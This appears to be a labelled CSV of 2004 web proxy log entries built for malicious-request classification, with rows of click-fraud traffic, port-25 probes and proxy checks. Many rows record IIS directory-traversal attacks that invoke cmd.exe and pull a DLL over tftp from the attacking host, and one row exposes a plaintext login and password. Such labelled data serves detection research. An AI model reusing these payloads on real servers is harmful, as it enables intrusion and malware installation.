,ipaddress,dateandtime,url,statuscode,bytessent,refferer,useragent,class,malicious,url_sem_query,qtd_query_params,navegador
111,220.173.17.142,09/Mar/2004:22:38:56 -0500,http://clickcheaper.com/go.php?u=sfasasapsdsksv&l=acassismanapaiscapaxsnfizkhosndnfodssszvznhnamshhdzxzmzxzhazsdaxaisxadsdsyafsdavszsmszakakafsvavafdfdkdvaaasfmzkhiahhyhaakazsfzdzszshohnzhhfzffizzhoaxafzmzozdzmzhzihfchcmcphhfkzvhnsnafhahnhkhyhxzozmhdhhdvzdzxszsmshfmhhzaszaoszsohdsoasdhdodoaaansfsosyaohvxmapsdhoavsvhnacaasassaxaiavssznskaxahdhzyhnfmhcxnaacmzaaiaoapsihvhsadzmhizvhosmzdhzhpsfhzapsoshzvhyhchszkhxziafhhhzfifkcizvsisnzmzyzvhpavavzvakzyzmavhvavscszzkaksoaczshczsavszakzcamakddxvdzaisosnamzzsfafzmhfznsasvsssxscspaasisozsazzdshakadhvhczyzkzhsmccdiffsphvaisyssafzczphfzzzsadaxzmaihxamsaadadhvssacafszsyzvsxaysnzpdpdofaafaisnhdadskzdsxsxaizzaiaksd&k=acassismanapaiscapaxsn&b=znhzzxzyzxznznhz&s=axsssismazfp&x=&t=&tw=&f=62683599fe13f479160d189c8e3ae8fc ,300,0,"""http://www.clickcheaper.com/search.php""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),m,1,/go.php,6,Microsoft Internet Explorer
112,220.173.17.142,09/Mar/2004:22:38:57 -0500,http://www.epilot.com/click.aspx?k=automobiles&b=320&p=kanoodle&s=seeky&pos=2&sid=b249b11f-66ef-4dd0-b111-291ecb6e205e&l=http%3A%2F%2Fwww.kanoodle.com%2Fclickthrough.cool%3Feid%3D1%26clickid%3D12486486%26id%3D70509698%26lid%3Dbhnnbingbknlbongbmnpbknmbonpbmno%26query%3Dautomobiles ,300,391,"""http://www.clickcheaper.com/search.php""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),m,1,/click.aspx,7,Microsoft Internet Explorer
113,220.173.17.142,09/Mar/2004:22:38:58 -0500,http://www.kanoodle.com/clickthrough.cool?eid=1&clickid=12486486&id=70509698&lid=bhnnbingbknlbongbmnpbknmbonpbmno&query=automobiles ,300,363,"""http://www.clickcheaper.com/search.php""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/clickthrough.cool,5,Microsoft Internet Explorer
114,61.172.244.112,09/Mar/2004:22:38:59 -0500,209.15.20.91:25 ,200,0,"""-""",-,n,0,209.15.20.91:25,0,without browser
115,68.48.142.117,09/Mar/2004:22:39:00 -0500,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
116,220.173.17.142,09/Mar/2004:22:39:06 -0500,http://www.carsdirect.com/home?partner=kano&customerid=agx~automobiles ,200,25085,"""http://www.clickcheaper.com/search.php""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/home,2,Microsoft Internet Explorer
117,195.116.208.249,09/Mar/2004:22:39:19 -0500,http://sit0.com/foo.php ,200,84,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),n,0,/foo.php,0,Microsoft Internet Explorer
118,195.116.208.249,09/Mar/2004:22:39:19 -0500,www.bzwbk.pl:443 ,400,381,"""-""",-,n,0,www.bzwbk.pl:443,0,without browser
119,195.116.208.249,09/Mar/2004:22:39:19 -0500,wacek.one.pl:2019 ,400,381,"""-""",-,n,0,wacek.one.pl:2019,0,without browser
120,195.116.208.249,09/Mar/2004:22:39:28 -0500,http://sit0.com/foo.php ,200,84,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),n,0,/foo.php,0,Microsoft Internet Explorer
121,195.116.208.249,09/Mar/2004:22:39:28 -0500,www.bzwbk.pl:443 ,400,381,"""-""",-,n,0,www.bzwbk.pl:443,0,without browser
122,195.116.208.249,09/Mar/2004:22:39:29 -0500,wacek.one.pl:2019 ,400,381,"""-""",-,n,0,wacek.one.pl:2019,0,without browser
123,220.173.17.142,09/Mar/2004:22:39:32 -0500,http://media.imatchup.com/images/affiliates/getbanner.asp?affid=240&bannerid=8&accountid=90&websiteid=2 ,200,0,"""http://www.so123.com""",Mozilla/4.0 (compatible; MSIE 5.5; Windows NT),n,0,/images/affiliates/getbanner.asp,4,Microsoft Internet Explorer
124,68.48.142.117,09/Mar/2004:22:39:45 -0500,/d/winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/d/winnt/system32/cmd.exe,0,without browser
125,68.48.142.117,09/Mar/2004:22:39:53 -0500,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
126,192.117.242.67,09/Mar/2004:22:39:54 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
127,192.117.242.67,09/Mar/2004:22:39:57 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
128,66.46.181.116,09/Mar/2004:22:40:07 -0500,/ ,200,4301,"""http://Network-Tools.com""",Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0; AspTear 1.5),n,0,/,0,Microsoft Internet Explorer
129,68.48.142.117,09/Mar/2004:22:40:35 -0500,/d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/d/winnt/system32/cmd.exe,0,without browser
130,68.48.142.117,09/Mar/2004:22:40:44 -0500,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
131,68.48.142.117,09/Mar/2004:22:41:29 -0500,/d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/d/winnt/system32/cmd.exe,0,without browser
132,68.48.142.117,09/Mar/2004:22:41:34 -0500,/_mem_bin/..%255c../..%255c../..%255c../httpodbc.dll ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../httpodbc.dll,0,without browser
133,68.48.142.117,09/Mar/2004:22:41:34 -0500,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe,0,without browser
134,68.48.142.117,09/Mar/2004:22:41:37 -0500,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe,0,without browser
135,68.48.142.117,09/Mar/2004:22:41:37 -0500,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe,0,without browser
136,68.48.142.117,09/Mar/2004:22:41:37 -0500,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe,0,without browser
137,68.48.142.117,09/Mar/2004:22:41:37 -0500,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../httpodbc.dll ,200,566,"""-""",-,m,1,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../httpodbc.dll,0,without browser
138,68.48.142.117,09/Mar/2004:22:41:37 -0500,/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%c1%1c../winnt/system32/cmd.exe,0,without browser
139,68.48.142.117,09/Mar/2004:22:41:37 -0500,/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%1c../winnt/system32/cmd.exe,0,without browser
140,68.48.142.117,09/Mar/2004:22:41:38 -0500,/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%1c../winnt/system32/cmd.exe,0,without browser
141,68.48.142.117,09/Mar/2004:22:41:41 -0500,/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%1c../winnt/system32/cmd.exe,0,without browser
142,68.48.142.117,09/Mar/2004:22:41:41 -0500,/scripts/..%c1%1c../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%1c../httpodbc.dll,0,without browser
143,68.48.142.117,09/Mar/2004:22:41:41 -0500,/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir ,400,305,"""-""",-,m,1,/scripts/..%c0%2f../winnt/system32/cmd.exe,0,without browser
144,68.48.142.117,09/Mar/2004:22:41:41 -0500,/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%c0%af../winnt/system32/cmd.exe,0,without browser
145,68.48.142.117,09/Mar/2004:22:41:41 -0500,/scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c0%af../winnt/system32/cmd.exe,0,without browser
146,68.48.142.117,09/Mar/2004:22:41:41 -0500,/scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c0%af../winnt/system32/cmd.exe,0,without browser
147,68.48.142.117,09/Mar/2004:22:41:41 -0500,/scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c0%af../winnt/system32/cmd.exe,0,without browser
148,68.48.142.117,09/Mar/2004:22:41:41 -0500,/scripts/..%c0%af../httpodbc.dll ,200,566,"""-""",-,n,0,/scripts/..%c0%af../httpodbc.dll,0,without browser
149,68.48.142.117,09/Mar/2004:22:41:42 -0500,/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%c1%9c../winnt/system32/cmd.exe,0,without browser
150,68.48.142.117,09/Mar/2004:22:41:42 -0500,/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%9c../winnt/system32/cmd.exe,0,without browser
151,68.48.142.117,09/Mar/2004:22:41:42 -0500,/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%9c../winnt/system32/cmd.exe,0,without browser
152,68.48.142.117,09/Mar/2004:22:41:42 -0500,/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%9c../winnt/system32/cmd.exe,0,without browser
153,68.48.142.117,09/Mar/2004:22:41:42 -0500,/scripts/..%c1%9c../httpodbc.dll ,200,566,"""-""",-,n,0,/scripts/..%c1%9c../httpodbc.dll,0,without browser
154,68.48.142.117,09/Mar/2004:22:41:42 -0500,/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir ,400,289,"""-""",-,m,1,/scripts/..%%35%63../winnt/system32/cmd.exe,0,without browser
155,68.48.142.117,09/Mar/2004:22:41:42 -0500,/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir ,400,289,"""-""",-,m,1,/scripts/..%%35c../winnt/system32/cmd.exe,0,without browser
156,68.48.142.117,09/Mar/2004:22:42:19 -0500,/d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/d/winnt/system32/cmd.exe,0,without browser
157,68.48.142.117,09/Mar/2004:22:42:19 -0500,/d/httpodbc.dll ,400,282,"""-""",-,n,0,/d/httpodbc.dll,0,without browser
158,68.48.142.117,09/Mar/2004:22:42:35 -0500,/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%25%35%63../winnt/system32/cmd.exe,0,without browser
159,68.48.142.117,09/Mar/2004:22:43:12 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
160,68.48.142.117,09/Mar/2004:22:43:25 -0500,/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%25%35%63../winnt/system32/cmd.exe,0,without browser
161,62.58.50.81,09/Mar/2004:22:43:26 -0500,205.231.29.241:25 ,200,0,"""-""",-,n,0,205.231.29.241:25,0,without browser
162,24.168.72.174,09/Mar/2004:22:43:47 -0500,http://login.korea.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exodus9971&passwd=christ ,200,566,"""-""",-,n,0,/config/login,8,without browser
163,62.58.50.81,09/Mar/2004:22:43:58 -0500,http://205.231.29.241:25/ ,200,85,"""-""",-,n,0,/,0,without browser
164,68.48.142.117,09/Mar/2004:22:44:03 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
165,68.48.142.117,09/Mar/2004:22:44:17 -0500,/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%25%35%63../winnt/system32/cmd.exe,0,without browser
166,68.48.142.117,09/Mar/2004:22:44:53 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
167,192.117.242.67,09/Mar/2004:22:45:06 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
168,192.117.242.67,09/Mar/2004:22:45:06 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
169,68.48.142.117,09/Mar/2004:22:45:08 -0500,/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%25%35%63../winnt/system32/cmd.exe,0,without browser
170,68.48.142.117,09/Mar/2004:22:45:43 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
171,203.121.182.189,09/Mar/2004:22:45:56 -0500,211.22.130.68:25 ,200,0,"""-""",-,n,0,211.22.130.68:25,0,without browser
172,68.48.142.117,09/Mar/2004:22:45:58 -0500,/scripts/..%25%35%63../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%25%35%63../httpodbc.dll,0,without browser
173,68.48.142.117,09/Mar/2004:22:46:36 -0500,/scripts/..%255c../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../httpodbc.dll,0,without browser
174,68.48.142.117,09/Mar/2004:22:46:48 -0500,/scripts/..%252f../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%252f../winnt/system32/cmd.exe,0,without browser
175,61.53.76.40,09/Mar/2004:22:47:17 -0500,http://69.59.175.60/found-best.com/search.php ,200,21081,"""http://www.sanlala.com/index.html""",Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt),n,0,/found-best.com/search.php,0,Microsoft Internet Explorer
176,220.175.18.42,09/Mar/2004:22:47:17 -0500,http://www.samair.ru/proxy/proxychecker/results.htm ,200,3931,"""-""",Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt),n,0,/proxy/proxychecker/results.htm,0,Microsoft Internet Explorer
177,220.175.18.42,09/Mar/2004:22:47:19 -0500,http://www.stayinvisible.com/index.pl/ip_test_result_nocache ,200,8030,"""-""",Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt),n,0,/index.pl/ip_test_result_nocache,0,Microsoft Internet Explorer
178,68.48.142.117,09/Mar/2004:22:47:26 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
179,220.175.18.42,09/Mar/2004:22:47:30 -0500,http://www.searchlikecrazy.com/cgi-bin/smartsearch.cgi?keywords=Web+Design%20&username=arongyi ,200,26166,"""http://www.yourwindow.com/searchlikecrazy.htm""",Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; MyIE2),n,0,/cgi-bin/smartsearch.cgi,2,Microsoft Internet Explorer
180,220.175.18.42,09/Mar/2004:22:47:35 -0500,http://searchlikecrazy.com/cgi-bin/sf.cgi?t=es&keys=zvzssxzazhzasohyzohxhiaxayziznzdsazmayaoaphsshahhhzisksisisfhmsvanaiasassdsnhisnanasahafhdhvzpzyzihoaxamhczpzyzvzazpzxhczzsasfzshizhszamsyhfspszsoaysssszvazfvfmhnhkzczizczvzdadadzn&kw=web+design ,300,333,"""http://www.searchlikecrazy.com/cgi-bin/smartsearch.cgi?keywords=Web+Design%20&username=arongyi""",Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; MyIE2),m,1,/cgi-bin/sf.cgi,3,Microsoft Internet Explorer
181,68.48.142.117,09/Mar/2004:22:47:38 -0500,/scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%252f../winnt/system32/cmd.exe,0,without browser
182,220.175.18.42,09/Mar/2004:22:47:40 -0500,http://65.17.208.131/search/search/redirect.php?s=5460953&r=1&l=1 ,300,0,"""http://www.searchlikecrazy.com/cgi-bin/smartsearch.cgi?keywords=Web+Design%20&username=arongyi""",Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; MyIE2),n,0,/search/search/redirect.php,3,Microsoft Internet Explorer
183,220.175.18.42,09/Mar/2004:22:47:41 -0500,http://www.kanoodle.com/clickthrough.cool?position=7001&tid=bhngbnnobonpbgnkbknpzqrdxbxoyx&bid=0.09&eid=1&id=77810869&query=web%20design&clickid=23442688&UNQ=00107889044985920592&subid=10470 ,300,344,"""http://www.searchlikecrazy.com/cgi-bin/smartsearch.cgi?keywords=Web+Design%20&username=arongyi""",Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; MyIE2),m,1,/clickthrough.cool,9,Microsoft Internet Explorer
184,220.175.18.42,09/Mar/2004:22:47:43 -0500,http://order.1and1.com/xml/order/Hosting?ac=OM.US.US431K02123T1785a ,300,647,"""http://www.searchlikecrazy.com/cgi-bin/smartsearch.cgi?keywords=Web+Design%20&username=arongyi""",Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; MyIE2),n,0,/xml/order/Hosting,1,Microsoft Internet Explorer
185,192.117.242.67,09/Mar/2004:22:47:49 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
186,220.175.18.42,09/Mar/2004:22:47:49 -0500,http://order.1and1.com/xml/order/Hosting;jsessionid=D05DD9B48032ADC5828D6F02C4D2935D.TC62a?ac=OM.US.US431K02123T1785a ,200,19093,"""http://www.searchlikecrazy.com/cgi-bin/smartsearch.cgi?keywords=Web+Design%20&username=arongyi""",Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; MyIE2),n,0,/xml/order/Hosting,1,Microsoft Internet Explorer
187,203.121.182.139,09/Mar/2004:22:47:56 -0500,212.69.119.246:25 ,200,0,"""-""",-,n,0,212.69.119.246:25,0,without browser
188,68.48.142.117,09/Mar/2004:22:48:16 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
189,217.82.29.57,09/Mar/2004:22:48:19 -0500,http://www.sun.com/ ,200,12257,"""http://www.heise.de""",Mozilla/4.0 (compatible; ICS),n,0,/,0,without browser
190,217.82.29.57,09/Mar/2004:22:48:23 -0500,http://proxyjudge.org/prxjdg.cgi ,200,1218,"""-""",Mozilla/4.0 (compatible; ICS),n,0,/prxjdg.cgi,0,without browser
191,217.82.29.57,09/Mar/2004:22:48:27 -0500,http://proxyjudge.org/prxjdg.cgi ,200,1218,"""-""",Mozilla/4.0 (compatible; ICS),n,0,/prxjdg.cgi,0,without browser
192,68.48.142.117,09/Mar/2004:22:48:28 -0500,/scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%252f../winnt/system32/cmd.exe,0,without browser
193,203.121.182.189,09/Mar/2004:22:48:40 -0500,61.172.201.173:25 ,200,0,"""-""",-,n,0,61.172.201.173:25,0,without browser
194,62.195.43.15,09/Mar/2004:22:49:05 -0500,http://62.195.43.15/members/sex/fuck/id000057id/lund2676lundxxx.html ,400,0,"""-""",-,n,0,/members/sex/fuck/id000057id/lund2676lundxxx.html,0,without browser
195,68.48.142.117,09/Mar/2004:22:49:09 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
196,203.121.182.141,09/Mar/2004:22:49:12 -0500,207.137.186.92:25 ,500,434,"""-""",-,n,0,207.137.186.92:25,0,without browser
197,68.48.142.117,09/Mar/2004:22:49:19 -0500,/scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%252f../winnt/system32/cmd.exe,0,without browser
198,68.48.142.117,09/Mar/2004:22:49:59 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
199,192.117.242.67,09/Mar/2004:22:50:05 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
200,218.68.219.92,09/Mar/2004:22:50:06 -0500,http://Pay-Per-Click.Ws/s.php?username=discovery&keywords=Lodging ,200,38043,"""http://Pay-Per-Click.Ws/s.php?username=discovery""",Mozilla/4.0(compatible; MSIE 5.5; Windows 98),n,0,/s.php,2,Microsoft Internet Explorer
201,68.48.142.117,09/Mar/2004:22:50:09 -0500,/scripts/..%252f../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%252f../httpodbc.dll,0,without browser
202,217.82.29.57,09/Mar/2004:22:50:09 -0500,http://www.sun.com/ ,200,12257,"""http://www.heise.de""",Mozilla/4.0 (compatible; ICS),n,0,/,0,without browser
203,217.82.29.57,09/Mar/2004:22:50:18 -0500,http://proxyjudge.org/prxjdg.cgi ,200,1218,"""-""",Mozilla/4.0 (compatible; ICS),n,0,/prxjdg.cgi,0,without browser
204,218.68.219.92,09/Mar/2004:22:50:27 -0500,http://www.pay-per-click.ws/other.php?k=hphahzhchszmhmhnhphazfzssifaandfaafosvdisifzfzfcdfdvfpfnfydhdmfcaxsysvdihhdydffmspdpafazdcfisoffdyskaofffifnfsfkfpskfkfpdzfidkavfyzcdhsnamfodifadndfdhfxspfvdofizodpfifysdaidyfzafdffysvdczpsyfidmasdcsvsidyzhavddskhzfkhsdddifvdcashzfmfifndkfvzydcfyfahfspdyfidpdkhcsnaxzkfxanfmazhzfdspdhdifhscdpaksvhxdkzhfodmzffifmsidpsidfazsfakfkspskdidfspdcsvfyandkfxscahdkfdfpsvdfandfasfodxacspdzdfavaadffkfmdvskzzfkfpdfadfpdfdkdyanfydpdcacfpfidffsfidkaisnhzzkdoffakfzfiffhhdcfafhaafzdxfisodzsifoszazshfphzfidffadcdphzfksssffsscdzashcfsfhdpsoapasfofyfashspdyfifzscdcfdshdzanfizydphxfpfmdkfzfyaazyfkdifmdcsosczpscfidisyfizhfyzvfzfosnhdfnsyanayazfidiszdpdkanfhdpfkfdspddazfkshzchzfksdfnfcscaodcfkazdsdzsifsszdphhdihaddfxsxznfzdxaxfififcffdpdpfisnsofnfxfkdnzkdsfxdndfzhscsvdcdsaxfsasdoscdszfaifmdzdffafyapzkfkfkhsdxfsapdyfzdhfdanzpdfdfshzksvfpsnzmzxsxsmzffffpsdzpfhscsvzfsnfpsnzdsdfpacdfdaaxsddzdffcapzcdsazdsdhdashfcaphsfhsxakfphiasaafxfnfydhdmfczmdfaasddzfnaoapdzhpfdfnfydhdmfcaozffksnssdkzxsxapscfpfndnfkszfidvzdfnsvshfvdasxahdcakdysodpzcavzyddaddisvfafsfhsvzffpfnfydhdmfcdfdvfpfnfydhsahpfvdvfpfnfkdhdmfcdffosvdisifaandfaafodmfhhisdazakshznaisxaxsfhpsysksksosdadaohpafaksxzpsasdsfsdsmskayshazsnsvaszcszsxafayaahzhphfayassdad&u=rpilot&a=discovery&sid=base&keywords=lodging&gen=s&gto=zpzahshyhszfzohyzizc ,300,0,"""http://Pay-Per-Click.Ws/s.php?username=discovery&keywords=Lodging""",Mozilla/4.0(compatible; MSIE 5.5; Windows 98),m,1,/other.php,7,Microsoft Internet Explorer
